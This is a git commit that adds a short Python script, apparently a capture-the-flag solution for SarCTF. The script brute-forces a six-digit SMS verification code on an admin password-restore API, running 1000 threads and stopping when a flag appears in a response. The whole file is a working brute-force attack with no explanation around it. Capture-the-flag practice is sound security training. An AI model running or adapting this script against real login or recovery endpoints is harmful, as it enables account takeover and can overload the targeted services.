7c164c744a8de4f68e85518984f3ae6589e4b108
linuxjustin <30632275+linuxjustin@users.noreply.github.com>
2020-02-17 02:03:02 -0500

    Create web-threading-sarctf.py

---
+++ web-threading-sarctf.py
@@ -0,0 +1,45 @@
+import requests
+import threading
+import itertools
+import re
+
+lock = threading.Lock()
+ctr = itertools.count(260000)
+co=""
+def smash():
+
+	#for x in range(260000,280000):
+	while True:
+		#code=str(x)
+		code = str(ctr.next()).rjust(6, '0')
+		url="http://sherlock-message.ru/api/admin.restore"	
+		conn=requests.get(url)	
+		out=conn.content
+		final=out.split(":")
+		final= final[4].split('"')
+		damn=final[1]
+		#print damn
+		#code="272263"
+		data={'hash': damn, 'sms_code': code}
+		#print data
+		ty=requests.post('http://sherlock-message.ru/api/admin.restore', data=data)
+		out= ty.content
+		#print out
+		flag = re.findall('FLAG{\w+}',out)
+		#print code
+		#print flag
+		lent=len(flag)
+		if lent==1:
+			print "damn",flag
+			break
+
+threads = []
+for i in range(1000):
+        t = threading.Thread(target=smash)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+for t in threads:
+        t.join()
+
